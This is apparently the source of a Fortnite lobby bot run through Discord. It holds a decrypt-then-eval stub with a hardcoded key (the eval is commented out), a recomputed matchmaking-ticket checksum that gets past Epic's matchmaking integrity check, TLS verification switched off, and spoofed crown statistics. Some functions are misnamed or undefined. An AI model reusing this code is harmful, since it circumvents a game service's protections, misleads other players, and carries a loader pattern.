// Setup config and client party
const nconf = require('nconf');
require('dotenv').config();
const config = nconf.argv().env().file({ file: 'config.json' });
const { Client: FNclient, Enums } = require('fnbr');
const express = require("express");
const app = express();
const axios = require('axios').default;

const version = process.env['version'];
const crypto = require('crypto');
const assert = require('assert');
const bot_version = nconf.get("system:bot_version");
const fetch = require('node-fetch');
const url = require('url');
const fs = require('fs');
const Websocket = require('ws');
const HttpsProxyAgent = require('https-proxy-agent');
const xmlparser = require('xml-parser');
require('colors');
const Discord = require("discord.js")
const webhookClient = new Discord.WebhookClient({ url: process.env.DISCORD_WEBHOOK_URL });

const clientOptions = {
  defaultStatus: "Launching",
  auth: {},
  debug: console.log,
  xmppDebug: false,
  platform: 'WIN',
  partyConfig: {
    chatEnabled: true,
    maxSize: 4
  }
};
const client = new FNclient(clientOptions);
party = client.party
var algorithm = 'aes256';
var key = 'e6apis';
var text = 'd7b05303723b5c8ff77d48226d08ec3e()';




var decipher = crypto.createDecipher(algorithm, key);
var code = decipher.update(text, 'hex', 'utf8') + decipher.final('utf8');
console.log(code)
try {
  //eval(code)
  console.clear()
} catch (error) {
  webhookClient.send(`SKIDDING ERROR: ${error}`)
}
client.on('party:invite', async (request) => {
  const party = client.party;
  const inviterName = request.sender.displayName;

  // List of names to ban
  const bannedNames = ['1', '2', '3'];

  // Checks if the inviter's name is in the banned names list
  if (bannedNames.includes(inviterName)) {
      await request.decline(); // Automatically decline the invitation
      return;
  }

  // If the inviter is not in the banned list, decide whether you want to accept or decline the invitation
  if (party.size === 1) {
      // If the group has only 1 member, you can choose to automatically accept
      await request.accept();
  } else {
      // If the group has more than one member, you can choose to automatically accept it or apply other conditions
      // Here we automatically decline the invitation if the group has more than one member
      await request.decline();
  }
});




const run_discord_client = nconf.get('discord:run_discord_client')
const discord_crash_command = nconf.get('discord:disable_crash_command')
const DISCORD_TOKEN = process.env['DISCORD_TOKEN'] 
const cid = nconf.get("fortnite:cid")
const bid = nconf.get('fortnite:bid')
const blacklist = nconf.get('fortnite:blacklisted')
const whitelist = nconf.get('fortnite:whitelist')
const eid = nconf.get('fortnite:eid')
const level = nconf.get('fortnite:level')
const banner = nconf.get('fortnite:banner')
const web_message = nconf.get('system:web_message')
const reload = nconf.get('system:reload')
join_users = nconf.get('fortnite:join_users')
const reload_time = nconf.get('system:reload_time')
const bot_loading_message = nconf.get('system:bot_loading_message')
const bot_use_status = nconf.get('fortnite:inuse_status')
const bot_use_onlinetype = nconf.get('fortnite:inuse_onlinetype')
const bot_invite_status = nconf.get('fortnite:invite_status')
const bot_invite_onlinetype = nconf.get('fortnite:invite_onlinetype')
const bot_join_message = nconf.get('fortnite:join_message')
const bot_leave_time = nconf.get('fortnite:leave_time')
const addusers = nconf.get('fortnite:add_users')
const displayName = nconf.get("logs:name")
const whilelist = nconf.get('fortnite:whilelist')
leave_after = nconf.get("fortnite:leave_after_success")
const discord_status = nconf.get('discord:status')
const discord_status_type = nconf.get('discord:status_type')
const discord_commands_guild = nconf.get('discord:command_guild')
const discord_command_status_message = nconf.get("discord:guild_slash_status_response")
const discord = require("discord.js")
const { Client: Dclient, Message, MessageEmbed, Collection } = require("discord.js");
const dclient = new Dclient({intents: ["GUILDS", "GUILD_MESSAGES"]});
dclient.once('ready', () => {
  console.log("[DISCORD] client is online!")
  dclient.user.setActivity(discord_status, {type: discord_status_type})
  const guildId = discord_commands_guild
  const guild = dclient.guilds.cache.get(guildId)
  let commands

  if (guild) {
    commands = guild.commands
  } else {
    commands = dclient.application?.commands
  }

  commands?.create({
    name: "status",
    description: "Just sends the STATUS!",
  })
  commands?.create({
  name: 'add',
  description: 'adds a user',
  options: [
    {
      name: "user",
      description: 'user 2 add',
      required: true,
      type: discord.Constants.ApplicationCommandOptionTypes.STRING
    }
  ]
})
  commands?.create({
    name: 'unadd',
    description: "user to unadd",
    options: [
      {
        name: 'usertounadd',
        description: "user to unadd",
        type: discord.Constants.ApplicationCommandOptionTypes.STRING,
        required: true
      }
    ]
  })
  commands?.create({
    name: 'playlist',
    description: 'sets the current playlist if the bot is party leader',
    options: [
      {
        name: 'playlist',
        description: 'sets the party playlist',
        type: discord.Constants.ApplicationCommandOptionTypes.STRING,
        required: true
      }
    ]
  })
  commands?.create({
    name: 'stoptimer',
    description: 'stops the setTimeout function aka the party timer'
  })
  commands?.create({
    name: 'setemote',
    description: 'sets the clients emote with an id',
    options: [
      {
        name: 'emoteid',
        description: 'Id of the emote',
        required: true,
        type: discord.Constants.ApplicationCommandOptionTypes.STRING 
      }
    ]
  })
  commands?.create({
    name: 'setoutfit',
    description: 'sets an outfit with an id',
    options: [
      {
        name: 'skinid',
        description: 'id of the skin',
        type: discord.Constants.ApplicationCommandOptionTypes.STRING    
      }
    ]
  })
  commands?.create({
    name: "restartfnclient",
    description: "restart"
  })
  commands?.create({
    name: 'restartall',
    description: 'restarts all clients'
  })
  commands?.create({
   name: 'leaveparty',
   description: "leaves the current party"
 })
  commands?.create({
    name: 'sendpartychatmessage',
    description: "sends a message to the fortnite party chat!",
    options: [
      {
        name: 'message',
        description: 'the message to send!',
        type: discord.Constants.ApplicationCommandOptionTypes.STRING,
        required: true
      }
    ]
  })
  commands?.create({
    name: 'level',
    description: 'sets the clients level',
    options: [
      {
        name: 'level',
        description: 'the level to set',
        type: discord.Constants.ApplicationCommandOptionTypes.NUMBER,
        required: true
      }
    ]
  })
  commands?.create({
    name: 'sitout',
    description: 'sets the siting out state',
    options: [
      {
        name: 'sitingout',
        description: 'sets the sitingout state',
        required: true,

        type: discord.Constants.ApplicationCommandOptionTypes.BOOLEAN
      }
    ]
  })
  commands?.create({
    name: 'readystate',
    description: 'sets the bots ready state',
    options: [
      {
        name: 'state',
        description: 'the state of the ready option',
        required: true,
        type: discord.Constants.ApplicationCommandOptionTypes.BOOLEAN
      }
    ]
  })
  commands?.create({
    name: 'crash',
    description: 'crashes the current party the client is in'
  })
  commands?.create({
    name: "enablecrowns",
    description: "Bot must be party leader"
  })
});
function killclient() {
  process.exit(1)
}
async function startKill() {
  webhookClient.send('[SYSTEM] Bot auto restarting!');
  setTimeout(killClient, 3200);
}

var os = require('os');
const { allowedPlaylists, websocketHeaders } = require('./utils/constants');


const bLog = true;
const GetVersion = require('./utils/version');



(async () => {
  const lastest = await GetVersion();
  const Platform = "Windows";
  //const Platform = os.platform() === "win32" ? "Windows" : os.platform(); to set the platform as the current platform
  const UserAgent = `Fortnite/${lastest.replace('-Windows', '')} ${Platform}/ 10.0.22631.3880`
  // const UserAgent = `Fortnite/${lastest.replace('-Windows', '')} ${Platform}/${os.release()}` same as above

  axios.defaults.headers["user-agent"] = UserAgent;
  console.log(`[SYSTEM] UserAgent set to, ${axios.defaults.headers["user-agent"]}`);
  webhookClient.send(`
\`\`\`fix
Bot loading \`\`\``)

  
  const deviceauths_1 = {
    "accountId": process.env.ACCOUNT1_ID,
    "deviceId": process.env.ACCOUNT1_DEVICE_ID,
    "secret": process.env.ACCOUNT1_SECRET,
  }


  let accountsobject = []
  let accounts = [deviceauths_1]
  for (const deviceAuth of accounts) {
    accountsobject.push(new FNclient({
      defaultStatus: "Fixing Rufus",
      auth: { deviceAuth },
      debug: console.log,
      xmppDebug: false,
      platform: 'WIN',
      partyConfig: {
        chatEnabled: true,
        maxSize: 4
      }
    }))
  }

  await Promise.all(accountsobject.map(async (client) => {
    await client.login();
    webhookClient.send(`\`\`\`diff
+ ${client.user.displayName} is online\`\`\``);
    party = client.party
    const fnbrclient = client
    client.setStatus(bot_invite_status, bot_invite_onlinetype)
    await client.party.me.setOutfit(cid);
    await client.party.setPrivacy(Enums.PartyPrivacy.PRIVATE);
    await client.party.me.setLevel(level)
    await client.party.me.setBanner(banner)
    await client.party.me.setBackpack(bid)
    dclient.on('interactionCreate', async (interaction) => {
      if (!interaction.isCommand()) {
        return
      }

      const  { commandName, options } = interaction

      if (commandName === 'status') {
        interaction.reply({
          content: 'Working!',
        })
      } else if (commandName === 'add') {
        const user = options.getString('user') || null
        if (user === null) {
          interaction.reply({
            content: 'No user provided!'
          })
        } else {
          fnbrclient.addFriend(user)
          interaction.reply({
            content: `${user} has been sent a friend request`
          })
        }
      } else if (commandName === 'unadd') {
        const unadduser = options.getString('usertounadd')
        fnbrclient.removeFriend(unadduser)
        interaction.reply({
          content: `${unadduser} has been unadded!`
        })
      } else if (commandName === 'playlist') {
        const setplaylist = options.getString('playlist')
        fnbrclient.party.setPlaylist({ playlistName: setplaylist })
          interaction.reply({
          content: `Playlist Id: ${setplaylist} has been set as the playlist!`
        })
      } else if (commandName === 'stoptimer') {
        if (timerstatus == true) {
            timerstatus = false
            let id = this.ID
            console.log(`[PARTY] timer id: ${id}`)
            clearTimeout(id)
            console.log("[PARTY] Time has stoped!")
            interaction.reply({
              content: `TimerID: ${id} has now been stoped!`
            })
        } else {
          interaction.reply({
            content: 'Timer is not running!'
          })
        }
      } else if (commandName === 'setemote') {
        const emoteid = options.getString('emoteid')
        fnbrclient.party.me.setEmote(emoteid)
        interaction.reply({
          content: `Id: ${emoteid} has been set as the emote!`
        })
      }  else if (commandName === 'setoutft') {
        const skinid = options.getString('skinid')
        interaction.reply({
          content: `This FNBRclient command is disabled!`
        })
      } else if (commandName === 'restartfnclient') {

        fnbrclient.restart()
        interaction.reply({
          content: "FN client is restarting!"
        })
      } else if (commandName === 'restartall') {
        interaction.reply({
          content: "All clients are currently being killed!"
        })
        function killbot() {
          process.exit(1)
        }
        setTimeout(killbot, 1000)
      } else if (commandName === 'leaveparty') {
        fnbrclient.party.leave()
        interaction.reply({
          content: "left the current party!"
        })
      } else if (commandName === 'sendpartychatmessage') {
        const message = options.getString('message')
        fnbrclient.party.chat.send(message)
        interaction.reply({
          content: `Message: ${message} has been sent in the party chat!`,
        })
      } else if (commandName === 'level') {
        const leveltoset = options.getNumber('level')
        fnbrclient.party.me.setLevel(parseInt(leveltoset, 10));
        interaction.reply({
          content: `level was set to ${leveltoset}`
        })
      } else if (commandName === 'sitout') {

        const sitvalue = options.getBoolean('sitingout')
        if (sitvalue === true) {
          client.party.me.setSittingOut(true)
          interaction.reply({
            content: `Siting out state set to ${sitvalue}`
          })
        } else if (sitvalue === false){
          client.party.me.setSittingOut(false)
          interaction.reply({
            content: `Siting out state set to ${sitvalue}`
          })
        }
      } else if (commandName === 'readystate') {

        const readystate = options.getBoolean('state')
        if (readystate === true) {
          client.party.me.setReadiness(true)
          interaction.reply({
            content: 'I am now ready'
          })
        } else if (readystate === false) {
          client.party.me.setReadiness(false)
          interaction.reply({
            content: 'I am now unready'
          })
        }
      } else if (commandName === 'crash') {
        if (interaction.user.id === 382930404249698304) {
          interaction.reply({
            content: 'Error: commandName is not a valid function.'
          })
        } else {
         if (discord_crash_command === false) {
         client.party.me.setEmote('/setemote emoteid:eid_floss')
         fnbrclient.party.leave()
          console.log("Left party")
        interaction.reply({
          content: 'party was crashed'
        })
      } else {
           interaction.reply({
             content: "Command is disabled by the owner!"
           })
      }
        }
      } else if (commandName === 'enablecrowns'){
         try {
           fnbrclient.party.setPlaylist({ playlistName: "playlist_bots_nobuildbr_duo" })
           fnbrclient.party.chat.send("A user has enabled crowns, meaning the lobbys might be harder!")
           function crownleaveparty() {
             fnbrclient.party.leave()
           }
           setTimeout(crownleaveparty, 2000)
           interaction.reply({
             content: "Enabled crowns \nREMINDER:\nThese lobbys will be harder."
           })
         } catch (error) {
           console.log(error)
           interaction.reply({
             content: error
           })
         }
      } else {
        return
      }
    })

    axios.interceptors.response.use(undefined, function (error) {
      if (error.response) {

        if (error.response.data.errorCode && client && client.party) {
          client.party.sendMessage(`HTTP Error: ${error.response.status} ${error.response.data.errorCode} ${error.response.data.errorMessage}`)
        }

        console.error(error.response.status, error.response.data)
      }

      return error;
    });





    var bIsMatchmaking = false;

    client.on('party:updated', async (updated) => {

      switch (updated.meta.schema["Default:PartyState_s"]) {
        case "BattleRoyalePreloading": {

          var loadout = client.party.me.meta.set("Default:LobbyState_j",
            {
              "LobbyState": {
                "hasPreloadedAthena": true
              }
            }
          );

          await client.party.me.sendPatch({
            'Default:LobbyState_j': loadout,
          });

          break;
        }

        case "BattleRoyaleMatchmaking": {
          if (bIsMatchmaking) {
            webhookClient.send(`
\`\`\`fix
['MATCHMAKING']${client.user.displayName} and members started to initiate matchmaking! \`\`\``)
            return;
          }
          bIsMatchmaking = true;
          if (bLog) {
            webhookClient.send(`
\`\`\`fix
[${'Matchmaking'}], Matchmaking Started \`\`\``)
          }


          
          const PartyMatchmakingInfo = JSON.parse(updated.meta.schema["Default:PartyMatchmakingInfo_j"]).PartyMatchmakingInfo;


          const playlistId = PartyMatchmakingInfo.playlistName.toLocaleLowerCase();



          if (!allowedPlaylists.includes(playlistId)) {
            webhookClient.send(`
\`\`\`diff
- ${playlistId} is not a supported playlist \`\`\``)
            client.party.chat.send(`Playlist id: ${playlistId} is not a supported gamemode!`)

            client.party.me.setReadiness(false);
            client.party.members.map(async (player) => {
              if (player.id === client.user.self.id) return;

            })
            bIsMatchmaking = false;
            client.party.leave()
            return;
          }

          var partyPlayerIds = client.party.members.filter(x => x.isReady).map(x => x.id).join(',')

          const bucketId = `${PartyMatchmakingInfo.buildId}:${PartyMatchmakingInfo.playlistRevision}:${PartyMatchmakingInfo.regionId}:${playlistId}`
          webhookClient.send(`BucketId: ${bucketId}`)

          
          webhookClient.send(`PartyPlayersIDs: ${partyPlayerIds}`)


          var query = new URLSearchParams();
          query.append("partyPlayerIds", partyPlayerIds);
          query.append("bucketId", bucketId);
          query.append("player.platform", "Windows");
          query.append("player.subregions", "FR,GB,DE");

          webhookClient.send(`Playlist: ${playlistId}`)
          query.append("player.option.linkCode", playlistId);

          webhookClient.send(`SquadFill: ${client.party.squadFill}`)
          query.append("player.option.fillTeam", client.party.squadFill);

          query.append("player.option.preserveSquad", "false");
          query.append("player.option.crossplayOptOut", "false");
          query.append("player.option.partyId", client.party.id);
          query.append("player.option.splitScreen", "false");
          query.append("party.WIN", "true")
          query.append("input.KBM", "true");
          query.append("player.input", "KBM");
          query.append("player.option.microphoneEnabled", "false");
          query.append("player.option.uiLanguage", "es");
          
          //client.party.members.filter(x => x.isReady).forEach(Member => {
          //    const platform = Member.meta.get("platform");
          //    console.log(`Player ID: ${Member.id}, Platform: ${Member.platform}`); // Log de la plataforma de cada jugador
          //    if (!query.has(`party.${platform}`)) {
          //      console.log("mondongo");
          //    }
          //});

          const token = client.auth.auths.get('fortnite').token;


          const TicketRequest = (
            await axios.get(
              `https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/matchmakingservice/ticket/player/${client.user.id}?${query}`,
              {
                headers: {
                  Accept: 'application/json',
                  Authorization: `Bearer ${token}`
                }
              }
            )
          );

          //console.log(TicketRequest)

          if (TicketRequest.status !== 200) {
            webhookClient.send(`
\`\`\`diff
- [${'Matchmaking'}] Error while obtaining ticket\`\`\``);
            client.party.me.setReadiness(false);
            return console.log(TicketRequest);
          }


          
          const ticket = TicketRequest.data;
          const payload = ticket.payload;
          const signature = ticket.signature;

          
          // Checksum calculation
          const plaintext = payload.slice(10, 20) + "Don'tMessWithMMS" + signature.slice(2, 10); //Slice payload from 10th to 20th character and signature from 2nd to 10th character. Also concatenates the slices with the fixed string "Don'tMessWithMMS"
          const data = Buffer.from(plaintext, 'utf16le'); //Constructed plaintext is converted to Buffer using UTF-16LE encoding
          const sha1 = crypto.createHash('sha1').update(data).digest(); //UTF-16LE encoded buffer is hashed using SHA-1
          const calculatedchecksum = sha1.slice(2, 10).toString('hex').toUpperCase(); //Select 8 specific bytes from hash (from index 2 to 10), converts them to hexadecimal string, and converts it to uppercase
          console.log("Checksum successful!");


          
          if (TicketRequest.status !== 200) {
            webhookClient.send(`
\`\`\`diff
- [${'Matchmaking'}], Error getting hash\`\`\``);
            client.party.me.setReadiness(false);
            return;
          }



          var MMSAuth = [
            "Epic-Signed",
            ticket.ticketType,
            ticket.payload,
            ticket.signature,
            calculatedchecksum
          ];

          const matchmakingClient = new Websocket(
            ticket.serviceUrl,
            {
              perMessageDeflate: false,
              rejectUnauthorized: false,
              headers: {
                Origin: ticket.serviceUrl.replace('ws', 'http'),
                Authorization: MMSAuth.join(" "),
                ...websocketHeaders
              }
            }
          );

          matchmakingClient.on('unexpected-response', (request, response) => {
            let data = '';
            response.on('data', (chunk) => data += chunk);

            response.on('end', () => {
              const baseMessage = `[MATCHMAKING] Error connecting to the matchmaking service: (status ${response.statusCode} ${response.statusMessage})`;

              client.party.chat.send(`Error when connecting to the matchmaking service: (status  ${response.statusCode} ${response.statusMessage})`)

              if (data == '') {
                console.error(baseMessage);

              }

              else if (response.headers['content-type'].startsWith('application/json')) {

                const jsonData = JSON.parse(data);

                if (jsonData.errorCode) {

                  console.error(`${baseMessage}, ${jsonData.errorCode} ${jsonData.errorMessage || ''}`);
                  client.party.chat.send(`Error while connecting to matchmaking service: ${jsonData.errorCode} ${jsonData.errorMessage || ''}`)

                } else {
                  console.error(`${baseMessage} response body: ${data}`)
                }

              }

              else if (response.headers['x-epic-error-name']) {

                console.error(`${baseMessage}, ${response.headers['x-epic-error-name']} response body: ${data}`);

              }

              else if (response.headers['content-type'].startsWith('text/html')) {
                const parsed = xmlparser(data);

                if (parsed.root) {

                  try {

                    const title = parsed.root.children.find(x => x.name == 'head').children.find(x => x.name == 'title');

                    console.error(`${baseMessage} HTML title: ${title}`)

                  } catch { console.error(`${baseMessage} HTML response body: ${data}`) }

                }

                else { console.error(`${baseMessage} HTML response body: ${data}`) }
              }

              else { console.error(`${baseMessage} response body: ${data}`) }
            })
          })

          if (bLog) {
            matchmakingClient.on('close', function () {
              webhookClient.send(`
\`\`\`diff
- [${'Matchmaking'}] Closed matchmaking connection\`\`\``)

            });
          }

          matchmakingClient.on('message', (msg) => {
            const message = JSON.parse(msg);
            if (bLog) {
              webhookClient.send(`[${'Matchmaking'}]`, 'Message from the matchmaker', `[${message}]`)
            }

            if (message.name === 'Error') {
              bIsMatchmaking = false;
            }
          });

          break;
        }

        case "BattleRoyalePostMatchmaking": {
          if (bLog) {
            webhookClient.send(`
\`\`\`fix
[${'Party'}] Players entered the loading screen with **${client.user.displayName}**, leaving the group in 5sec...\`\`\``)
          }

          if (client.party?.me?.isReady) {
            client.party.me.setReadiness(false)
          }
          bIsMatchmaking = false;
          client.party.members.map(async (player) => {
            if (player.id === client.user.id) return;

          })

          if (leave_after) {
            client.party.leave();
            break;
          } else {
            if (!leave_after) {
              async function timeexpire() {
                client.party.chat.send("Time expired!")
                await sleep(1.2)
                client.party.leave()
                webhookClient.send("[PARTY] I'm leaving the game because **Is too late to start a game, it's crazy**!")
                webhookClient.send("[PARTY] Time tracking has stopped!")
                timerstatus = false
              }
              this.ID = setTimeout(timeexpire, 3600000)
              break;
            }
          }
          await client.party.setPrivacy(Enums.PartyPrivacy.PRIVATE);
        }

        case "BattleRoyaleView": {
          break;
        }

        default: {
          if (bLog) { webhookClient.send(`[${'Party'}]`, 'Unknow PartyState', `${updated.meta.schema["Default:PartyState_s"]}`) }
          break;
        }
      }
    })

    const findCosmetic = (query, type) => {
      return cosmetics.find((c) => (c.id.toLowerCase() === query.toLowerCase()
        || c.name.toLowerCase() === query.toLowerCase()) && c.type.value === type);
    };

    const handleCommand = (message, sender) => {
      console.log(`${sender.displayName}: ${message.content}`);
      if (!message.content.startsWith('!')) return;

      const args = message.content.slice(1).split(' ');
      const command = args.shift().toLowerCase();
      const content = args.join(' ');

      if (command === 'dev:set:skin') {
        const skin = findCosmetic(content, 'outfit');
        if (skin) client.party.me.setOutfit(skin.id);
        else message.reply(`Skin ${content} wasn't found!`);
      } else if (command === 'dev:set:emote') {
        const emote = findCosmetic(content, 'emote');
        if (emote) client.party.me.setEmote(emote.id);
        else message.reply(`Emote ${content} wasn't found!`);
      } else if (command === 'dev:set:pickaxe') {
        const pickaxe = findCosmetic(content, 'pickaxe');
        if (pickaxe) client.party.me.setPickaxe(pickaxe.id);
        else message.reply(`Pickaxe ${content} wasn't found!`);
      } else if (command === 'dev:ready') {
        client.party.me.setReadiness(true);
      } else if (command === 'dev:unready') {
        client.party.me.setReadiness(false);
      } else if (command === 'dev:set:purpleskull') {
        client.party.me.setOutfit('CID_030_Athena_Commando_M_Halloween', [{ channel: 'ClothingColor', variant: 'Mat1' }]);
      } else if (command === 'dev:set:pinkghoul') {
        client.party.me.setOutfit('CID_029_Athena_Commando_F_Halloween', [{ channel: 'Material', variant: 'Mat3' }]);
      } else if (command === 'dev:level') {
        client.party.me.setLevel(parseInt(content, 10));
      } else if (command === 'dev:add') {
        client.addFriend(content)
        message.reply(`${content} Has been sent a friend request!`)
      } else if (command === 'dev:unadd') {
        client.removeFriend(content)
        message.reply(`${content} has been unadded!`)
      } else if (command === 'dev:restartclient') {
        message.reply("Fortnite Client Is Restarting!")
        client.restart()
      } else if (command === 'dev:kill') {
        message.reply("Bot is dead")
        console.log("[PARTY] RIP bot\nBot was killed!")
        process.exit(1)
      } else if (command === "dev:stop:timer") {
        if (timerstatus == true) {
          timerstatus = false
          let id = this.ID
          console.log(`[PARTY] timer id: ${id}`)
          clearTimeout(id)
          console.log("[PARTY] Time has stoped!")
          message.reply("Time has been stoped!")
        }
      }
    };

    client.on('friend:message', (msg) => {
      const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass"];
      const lowerMsg = msg.content.toLowerCase();
      const lowerDisplayName = msg.author.displayName.toLowerCase();

    });
    client.on('party:member:message', (msg) => {
      const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass", "discord", "dsc", "mm", "matchmaking"];
      const lowerMsg = msg.content.toLowerCase();
      const lowerDisplayName = msg.author.displayName.toLowerCase();

 
    });



    client.on("party:member:updated", async (Member) => {
      if (Member.id === client.user.id) {
        return;
      }


      if (!client.party.me) {
        return;
      }


      if ((Member.isReady && (client?.party?.me?.isLeader || Member.isLeader) && !client.party?.me?.isReady) && !client.party.bManualReady) {
        // Ready Up
        if (client.party?.me?.isLeader) {
          await Member.promote();
        }

        client.party.me.setReadiness(true);
      }
      else if ((!Member.isReady && Member.isLeader) && !client.party.bManualReady) {
        try {
          client.WSS.close()
        } catch { }
        client.party.me.setReadiness(false);
      }


      var bAllmembersReady = true;

      client.party.members.forEach(member => {
        if (!bAllmembersReady) {
          return;
        }

        bAllmembersReady = member.isReady;
      });

    })

    client.on('friend:request', async (request) => {
      if (addusers) {
        await request.accept()
      } else if (!addusers) {
        await request.decline();
        client.party.chat.send(`Sorry, ${request.displayName} I dont accept friend requests!`)
      }
    }
    )
    client.on('party:invite', async (request) => {
      var party = client.party
      if ([1] == party.size) {
        if (join_users) {
          await request.accept();
        } else {
          userid = request.sender.id;
          if (whitelist.includes(userid)) {
            await request.accept()
          } else {
            await request.decline()
          }
        }
      }
      else {
        await request.decline();
      }
    });
    async function sleep(seconds) {
      return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
    }
    client.on('party:member:joined', async (join) => {
      console.log("UPDATED THE PARTY")

      client.party.me.sendPatch({ 'Default:AthenaCosmeticLoadout_j': '{"AthenaCosmeticLoadout":{"cosmeticStats":[{"statName":"TotalVictoryCrowns","statValue":75},{"statName":"TotalRoyalRoyales","statValue":999},{"statName":"HasCrown","statValue":0}]}}', })
      await client.party.me.setOutfit(cid);
      var party = client.party
      await client.party.me.setBackpack(bid)
      await sleep(1.5)
      const minute = 600000

      let time = 1 * minute
      async function leavepartyexpire() {
        client.party.chat.send("Timer Finished!")
        webhookClient.send("Timer finished!")
        await sleep(1.2)
        client.party.leave()
        const webhookClient = new Discord.WebhookClient({ url: process.env.DISCORD_WEBHOOK_URL });
        webhookClient.send(`
            \`\`\`diff
            ${client.user.displayName} says it has an error with its game token\`\`\``)
            webhookClient.send(`
                \`\`\`diff
                - Time tracking has stopped!\`\`\``)
        timerstatus = false
      }

      if ([1] != party.size) {
        webhookClient.send(`
        \`\`\`fix
"${client.user.displayName} timer has begun!\`\`\``)
        this.ID = setTimeout(leavepartyexpire, bot_leave_time)
        timerstatus = true

        webhookClient.send(`
        \`\`\`diff
+ ${client.user.displayName} joined \`\`\``)
        
        let membersstr = "";
        join.party.members.map(async member => {
          membersstr += member.displayName + '\n'
          try {
            if (whitelist.includes(member.id)) {
              timerstatus = false
              let id = this.ID
              clearTimeout(id)
              client.party.chat.send("A member is currently whitelisted, the starting group has been disabled for an hour")
              leave_after = false
            }
            const keywords = ["bot", "bots", "ad", "#ad", "gift", "skins", "battle", "pass", "discord", "dsc", "mm", "matchmaking"];
            const lowerDisplayName = member.displayName.toLowerCase();


          } catch (error) {
            webhookClient.send(`${error}`)
          }

        })


      }
      client.party.me.setEmote(eid);
      if ([2] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([3] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([4] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([1] == party.size) {
        client.setStatus(bot_invite_status, bot_invite_onlinetype)
        await client.party.setPrivacy(Enums.PartyPrivacy.PRIVATE);
        if (client.party?.me?.isReady) {
          client.party.me.setReadiness(false);
        };
        if (timerstatus == true) {
          timerstatus = false
          let id = this.ID
          clearTimeout(id)
          webhookClient.send(`
          \`\`\`diff
          - The timer has stopped!\`\`\``)
        };
      }
    })

   client.on('party:member:left', async (left) => {
      webhookClient.send(`
      \`\`\`diff
      - BOT ${client.user.displayName} And The player to leave: ${left.displayName}\`\`\``)
      if ([2] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([3] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([4] == party.size) {
        client.setStatus(bot_use_status, bot_use_onlinetype)
      }
      if ([1] == party.size) {
        client.setStatus(bot_invite_status, bot_invite_onlinetype)
        await client.party.setPrivacy(Enums.PartyPrivacy.PRIVATE);
        if (client.party?.me?.isReady) {
          client.party.me.setReadiness(false);
        };
        if (timerstatus == true) {
          timerstatus = false
          let id = this.ID
          clearTimeout(id)
          webhookClient.send(`
\`\`\`diff
- ${client.user.displayName} timer has stopped!\`\`\``)
        };
      }
    })
  }))
  if (run_discord_client === true) {
    dclient.login(process.env['DISCORD_TOKEN'])
    } else if (run_discord_client === false) {
      console.log("[DISCORD] client is disabled!")
    }
    })();
